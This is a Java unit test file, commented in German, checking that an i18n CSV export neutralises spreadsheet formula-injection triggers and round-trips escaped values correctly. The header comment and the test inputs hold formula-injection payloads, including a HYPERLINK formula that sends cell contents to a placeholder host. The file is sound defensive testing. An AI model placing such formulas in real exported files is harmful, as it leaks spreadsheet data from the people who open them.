/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at https://mozilla.org/MPL/2.0/. */
package ch.plaintext.i18n.web;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.lang.reflect.Method;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * SECURITY (Karte 314, Punkt 15) — CSV-/Formula-Injection im i18n-Export.
 *
 * <p>Uebersetzungstexte sind von Administratoren frei befuellbar und landen ueber
 * {@code GET /api/i18n/export} in einer CSV-Datei. Beginnt ein Wert mit {@code =}, {@code +},
 * {@code -} oder {@code @}, interpretieren Excel, LibreOffice und Google Sheets die Zelle beim
 * Oeffnen als FORMEL — ein Text wie {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")}
 * exfiltriert dann Zellinhalte oder startet externe Aufrufe auf dem Rechner des Empfaengers.
 */
@DisplayName("I18n-Export: CSV-Injection")
class I18nCsvInjectionTest {

    private final I18nExportController controller = new I18nExportController(null);

    private String escape(String value) throws Exception {
        Method m = I18nExportController.class.getDeclaredMethod("escapeCsv", String.class);
        m.setAccessible(true);
        return (String) m.invoke(controller, value);
    }

    private String unescape(String value) throws Exception {
        Method m = I18nExportController.class.getDeclaredMethod("unescapeCsv", String.class);
        m.setAccessible(true);
        return (String) m.invoke(controller, value);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "=HYPERLINK(\"https://example.invalid\",\"klick\")",
            "+1+1",
            "-2+3",
            "@SUM(A1:A9)"
    })
    void formulaTriggersAreNeutralised(String payload) throws Exception {
        String escaped = escape(payload);

        assertTrue(escaped.startsWith("'") || escaped.startsWith("\"'"),
                "Formel-Trigger muss neutralisiert werden, war: " + escaped);
    }

    @Test
    void harmlessValuesAreUnchanged() throws Exception {
        assertEquals("Speichern", escape("Speichern"));
        assertEquals("", escape(null));
    }

    @Test
    void exportImportRoundTripRestoresOriginal() throws Exception {
        String original = "=SUM(A1:A2)";

        assertEquals(original, unescape(escape(original)));
    }

    @Test
    void roundTripDoesNotAccumulateApostrophes() throws Exception {
        String original = "=1+1";

        String once = unescape(escape(original));
        String twice = unescape(escape(once));

        assertEquals(original, twice);
    }
}
